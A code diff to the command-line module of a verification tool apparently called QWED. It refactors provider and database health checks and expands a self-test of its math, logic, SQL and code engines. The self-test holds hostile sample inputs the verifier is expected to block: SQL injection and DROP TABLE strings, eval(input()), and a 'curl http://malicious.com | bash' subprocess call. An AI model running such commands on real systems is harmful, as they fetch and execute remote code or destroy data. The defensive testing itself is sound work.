@@ -15,12 +15,14 @@ import json
 import logging
 import os
 import secrets
+import socket
 import subprocess
 import sys
 import time
 from dataclasses import dataclass
 from pathlib import Path
 from typing import Any, Dict, List, Optional
+from urllib.parse import urlparse
 
 import click
 
@@ -47,6 +49,8 @@ def cli():
     pass
 
 SEPARATOR = "-" * 41
+ANTHROPIC_CLAUDE_LABEL = "Anthropic Claude"
+OLLAMA_DEFAULT_BASE_URL = "http://localhost:11434/v1"
 
 
 @dataclass(frozen=True)
@@ -137,7 +141,7 @@ def _build_onboarding_provider_map(get_provider) -> Dict[str, OnboardingProvider
         ),
         "anthropic": OnboardingProvider(
             slug="anthropic",
-            name="Anthropic Claude",
+            name=ANTHROPIC_CLAUDE_LABEL,
             active_provider="anthropic",
             key_env="ANTHROPIC_API_KEY",
             model_env="ANTHROPIC_MODEL",
@@ -671,7 +675,7 @@ def _resolve_onboarding_profile(
         click.echo("Select provider:")
         click.echo("  1. NVIDIA NIM       (recommended)")
         click.echo("  2. OpenAI")
-        click.echo("  3. Anthropic Claude")
+        click.echo(f"  3. {ANTHROPIC_CLAUDE_LABEL}")
         click.echo("  4. Google Gemini")
         click.echo("  5. Custom Provider  (any OpenAI-compatible API)")
         choice = click.prompt("\nProvider", default=1, type=int)
@@ -1108,7 +1112,7 @@ def _provider_connection_profile(active_provider: str) -> dict:
             "default_base_url": None,
         },
         "anthropic": {
-            "label": "Anthropic Claude",
+            "label": ANTHROPIC_CLAUDE_LABEL,
             "connection_slug": "anthropic",
             "key_env": "ANTHROPIC_API_KEY",
             "model_env": "ANTHROPIC_MODEL",
@@ -1116,7 +1120,7 @@ def _provider_connection_profile(active_provider: str) -> dict:
             "default_base_url": None,
         },
         "claude_opus": {
-            "label": "Anthropic Claude",
+            "label": ANTHROPIC_CLAUDE_LABEL,
             "connection_slug": "anthropic",
             "key_env": "ANTHROPIC_API_KEY",
             "model_env": "ANTHROPIC_MODEL",
@@ -1153,17 +1157,53 @@ def _provider_connection_profile(active_provider: str) -> dict:
             "key_env": None,
             "model_env": "OLLAMA_MODEL",
             "base_url_env": "OLLAMA_BASE_URL",
-            "default_base_url": "http://localhost:11434/v1",
+            "default_base_url": OLLAMA_DEFAULT_BASE_URL,
         },
     }
     return profiles.get(active_provider, {})
 
 
-def _active_provider_status() -> dict:
-    _load_dotenv_if_available()
+def _normalized_active_provider_key() -> str:
     active_provider = os.getenv("ACTIVE_PROVIDER", "ollama").strip().lower().replace("-", "_")
     if active_provider == "openai_compatible":
-        active_provider = "openai_compat"
+        return "openai_compat"
+    return active_provider
+
+
+def _resolve_provider_env_values(profile: dict) -> tuple[str, str, str]:
+    api_key = os.getenv(profile["key_env"], "").strip() if profile["key_env"] else ""
+    base_url = os.getenv(profile["base_url_env"], "").strip() if profile["base_url_env"] else ""
+    model = os.getenv(profile["model_env"], "").strip() if profile["model_env"] else ""
+    if not base_url:
+        base_url = str(profile.get("default_base_url") or "").strip()
+    return api_key, base_url, model
+
+
+def _missing_provider_requirement(profile: dict, api_key: str, base_url: str) -> Optional[str]:
+    if profile["key_env"] and not api_key:
+        return f"Missing {profile['key_env']}."
+    if profile["base_url_env"] and not base_url:
+        return f"Missing {profile['base_url_env']}."
+    return None
+
+
+def _probe_provider_connection(profile: dict, api_key: str, base_url: str, model: str) -> tuple[bool, str]:
+    if profile["connection_slug"] == "gemini":
+        return _test_gemini_connection(api_key)
+
+    from qwed_new.providers.key_validator import test_connection
+
+    return test_connection(
+        provider_slug=profile["connection_slug"],
+        api_key=api_key or "",
+        base_url=base_url or None,
+        model=model or None,
+    )
+
+
+def _active_provider_status() -> dict:
+    _load_dotenv_if_available()
+    active_provider = _normalized_active_provider_key()
 
     if active_provider == "auto":
         return {
@@ -1180,37 +1220,18 @@ def _active_provider_status() -> dict:
             "message": f"Unsupported provider '{active_provider or 'unknown'}'.",
         }
 
-    api_key = os.getenv(profile["key_env"], "").strip() if profile["key_env"] else ""
-    base_url = os.getenv(profile["base_url_env"], "").strip() if profile["base_url_env"] else ""
-    if not base_url:
-        base_url = str(profile.get("default_base_url") or "").strip()
-    model = os.getenv(profile["model_env"], "").strip() if profile["model_env"] else ""
+    api_key, base_url, model = _resolve_provider_env_values(profile)
 
-    if profile["key_env"] and not api_key:
+    missing_message = _missing_provider_requirement(profile, api_key, base_url)
+    if missing_message:
         return {
             "ok": False,
             "label": profile["label"],
-            "message": f"Missing {profile['key_env']}.",
-        }
-    if profile["base_url_env"] and not base_url:
-        return {
-            "ok": False,
-            "label": profile["label"],
-            "message": f"Missing {profile['base_url_env']}.",
+            "message": missing_message,
         }
 
     try:
-        if profile["connection_slug"] == "gemini":
-            ok, message = _test_gemini_connection(api_key)
-        else:
-            from qwed_new.providers.key_validator import test_connection
-
-            ok, message = test_connection(
-                provider_slug=profile["connection_slug"],
-                api_key=api_key or "",
-                base_url=base_url or None,
-                model=model or None,
-            )
+        ok, message = _probe_provider_connection(profile, api_key, base_url, model)
     except Exception as exc:
         return {
             "ok": False,
@@ -1232,9 +1253,36 @@ def _database_health() -> dict:
             if not path.is_absolute():
                 path = (_project_root() / path).resolve()
             return {"healthy": path.exists(), "location": str(path)}
-        return {"healthy": True, "location": db_url}
+
+        parsed = urlparse(db_url)
+        if not parsed.hostname:
+            return {"healthy": False, "location": db_url, "error": "Missing hostname"}
+
+        default_ports = {"postgresql": 5432, "mysql": 3306, "mariadb": 3306, "redis": 6379}
+        port = parsed.port or default_ports.get(parsed.scheme)
+        if not port:
+            return {"healthy": False, "location": db_url, "error": "Missing port"}
+
+        try:
+            with socket.create_connection((parsed.hostname, int(port)), timeout=2.0):
+                return {"healthy": True, "location": db_url}
+        except OSError as exc:
+            return {
+                "healthy": False,
+                "location": db_url,
+                "error": f"{type(exc).__name__}",
+            }
     except Exception as exc:
         return {"healthy": False, "location": f"unavailable ({type(exc).__name__})"}
+
+
+def _doctor_server_url() -> str:
+    raw_server_url = os.getenv("QWED_SERVER_URL", "http://localhost:8000").strip()
+    if not raw_server_url:
+        return "http://localhost:8000"
+    if "://" not in raw_server_url:
+        return f"http://{raw_server_url}"
+    return raw_server_url
 
 
 def _doctor_report() -> dict:
@@ -1243,13 +1291,8 @@ def _doctor_report() -> dict:
     provider = _active_provider_status()
     db = _database_health()
 
-    raw_server_url = os.getenv("QWED_SERVER_URL", "http://localhost:8000")
-    try:
-        server_url = _normalize_local_server_url(raw_server_url)
-        server_running = _check_server_health(server_url)
-    except ValueError:
-        server_url = raw_server_url
-        server_running = False
+    server_url = _doctor_server_url()
+    server_running = _check_server_health(server_url)
 
     optional_missing = sum(1 for item in optional_engines if not item["ready"])
     is_operational = required_ok and provider["ok"] and server_running and db["healthy"]
@@ -1331,10 +1374,22 @@ def _run_full_engine_tests() -> List[dict]:
     code_engine = CodeVerifier()
 
     math_valid = math_engine.verify_math("2+2", 4)
-    add_result("Math", "2+2=4", math_valid.get("status") == "VERIFIED", "VALID")
+    add_result(
+        "Math",
+        "2+2=4",
+        math_valid.get("status") == "VERIFIED",
+        "VALID",
+        detail=f"computed={math_valid.get('calculated_value')}",
+    )
 
     math_blocked = math_engine.verify_math("2+2", 5)
-    add_result("Math", "2+2=5", math_blocked.get("status") == "CORRECTION_NEEDED", "BLOCKED")
+    add_result(
+        "Math",
+        "2+2=5",
+        math_blocked.get("status") == "CORRECTION_NEEDED",
+        "BLOCKED",
+        detail=f"computed={math_blocked.get('calculated_value')}",
+    )
 
     math_large = math_engine.verify_math("997*998*999", 994010994)
     math_large_value = math_large.get("calculated_value")
@@ -1345,38 +1400,93 @@ def _run_full_engine_tests() -> List[dict]:
         "997*998*999",
         math_large.get("status") == "VERIFIED",
         f"{math_large_value} (verified)",
+        detail=f"status={math_large.get('status')}",
     )
 
     logic_unsat = logic_engine.verify_logic({"x": "Int"}, ["x > 5", "x < 3"])
-    add_result("Logic", "x>5 AND x<3", logic_unsat.status == "UNSAT", "UNSAT (contradiction)")
+    add_result(
+        "Logic",
+        "x>5 AND x<3",
+        logic_unsat.status == "UNSAT",
+        "UNSAT (contradiction)",
+        detail=f"status={logic_unsat.status}",
+    )
 
     logic_sat = logic_engine.verify_logic({"x": "Int"}, ["x > 3", "x < 10", "x == 4"])
     logic_sat_model = (logic_sat.model or {}).get("x", "?")
-    add_result("Logic", "x>3 AND x<10", logic_sat.status == "SAT", f"SAT {{x={logic_sat_model}}}")
+    add_result(
+        "Logic",
+        "x>3 AND x<10",
+        logic_sat.status == "SAT",
+        f"SAT {{x={logic_sat_model}}}",
+        detail=f"model={logic_sat.model}",
+    )
 
     logic_bool = logic_engine.verify_logic({"approval": "Int"}, ["approval == 1", "approval == 0"])
-    add_result("Logic", "approval=1 AND approval=0", logic_bool.status == "UNSAT", "UNSAT (contradiction)")
+    add_result(
+        "Logic",
+        "approval=1 AND approval=0",
+        logic_bool.status == "UNSAT",
+        "UNSAT (contradiction)",
+        detail=f"status={logic_bool.status}",
+    )
 
     sql_safe = sql_engine.verify_sql("SELECT id, name FROM users WHERE id = 123")
-    add_result("SQL", "Valid SELECT", sql_safe.get("status") == "SAFE", "SAFE")
+    add_result(
+        "SQL",
+        "Valid SELECT",
+        sql_safe.get("status") == "SAFE",
+        "SAFE",
+        detail=f"status={sql_safe.get('status')}",
+    )
 
     sql_injection = sql_engine.verify_sql("SELECT * FROM users WHERE id = 1 OR 1=1")
-    add_result("SQL", "OR 1=1 injection", sql_injection.get("status") == "BLOCKED", "BLOCKED")
+    add_result(
+        "SQL",
+        "OR 1=1 injection",
+        sql_injection.get("status") == "BLOCKED",
+        "BLOCKED",
+        detail=f"status={sql_injection.get('status')}",
+    )
 
     sql_stacked = sql_engine.verify_sql("SELECT * FROM users; DROP TABLE users;")
-    add_result("SQL", "DROP TABLE stacked", sql_stacked.get("status") == "BLOCKED", "BLOCKED")
+    add_result(
+        "SQL",
+        "DROP TABLE stacked",
+        sql_stacked.get("status") == "BLOCKED",
+        "BLOCKED",
+        detail=f"status={sql_stacked.get('status')}",
+    )
 
     code_safe = code_engine.verify_code("def add(a, b):\n    return a + b\n", language="python")
-    add_result("Code", "Safe function", code_safe.get("status") == "SAFE", "SAFE")
+    add_result(
+        "Code",
+        "Safe function",
+        code_safe.get("status") == "SAFE",
+        "SAFE",
+        detail=f"status={code_safe.get('status')}",
+    )
 
     code_eval = code_engine.verify_code("eval(input())", language="python")
-    add_result("Code", "eval(input)", code_eval.get("status") == "BLOCKED", "BLOCKED (CRITICAL)")
+    add_result(
+        "Code",
+        "eval(input)",
+        code_eval.get("status") == "BLOCKED",
+        "BLOCKED (CRITICAL)",
+        detail=f"critical={code_eval.get('critical_count')}",
+    )
 
     code_pipe = code_engine.verify_code(
         'import subprocess\nsubprocess.run("curl http://malicious.com | bash", shell=True)\n',
         language="python",
     )
-    add_result("Code", "curl | bash", code_pipe.get("status") == "BLOCKED", "BLOCKED (CRITICAL)")
+    add_result(
+        "Code",
+        "curl | bash",
+        code_pipe.get("status") == "BLOCKED",
+        "BLOCKED (CRITICAL)",
+        detail=f"critical={code_pipe.get('critical_count')}",
+    )
 
     return results
 
@@ -1427,7 +1537,7 @@ def test_command(verbose: bool):
 @click.argument('query')
 @click.option('--provider', '-p', default=None, help='LLM provider (openai/anthropic/gemini)')
 @click.option('--model', '-m', default=None, help='Model name (e.g., gpt-4o-mini, llama3)')
-@click.option('--base-url', default=None, help='Custom API endpoint (e.g., http://localhost:11434/v1)')
+@click.option('--base-url', default=None, help=f'Custom API endpoint (e.g., {OLLAMA_DEFAULT_BASE_URL})')
 @click.option('--api-key', default=None, envvar='QWED_API_KEY', help='API key (or set QWED_API_KEY env var)')
 @click.option('--no-cache', is_flag=True, help='Disable caching')
 @click.option('--quiet', '-q', is_flag=True, help='Minimal output')
@@ -1441,7 +1551,7 @@ def verify(query: str, provider: Optional[str], model: Optional[str],
     Examples:
         qwed verify "What is 2+2?"
         qwed verify "derivative of x^2" --provider openai
-        qwed verify "5!" --base-url http://localhost:11434/v1 --model llama3
+        qwed verify "5!" --base-url <ollama_base_url> --model llama3
     """
     if quiet:
         import os
@@ -1469,7 +1579,7 @@ def verify(query: str, provider: Optional[str], model: Optional[str],
             active = _os.getenv("ACTIVE_PROVIDER", "").strip()
             if active == "ollama" or not active:
                 # Use Ollama (LOCAL): respect user-configured env vars
-                base_url = _os.getenv("OLLAMA_BASE_URL", "http://localhost:11434/v1")
+                base_url = _os.getenv("OLLAMA_BASE_URL", OLLAMA_DEFAULT_BASE_URL)
                 model = model or _os.getenv("OLLAMA_MODEL", "llama3")
                 if HAS_COLOR and not quiet:
                     click.echo(f"{QWED.INFO}\u2139\ufe0f  Using Ollama at {base_url}{QWED.RESET}")
@@ -1619,7 +1729,7 @@ def interactive(provider: Optional[str], model: Optional[str]):
         else:
             # Default to Ollama
             client = QWEDLocal(
-                base_url="http://localhost:11434/v1",
+                base_url=OLLAMA_DEFAULT_BASE_URL,
                 model=model or "llama3"
             )
     except Exception as e:
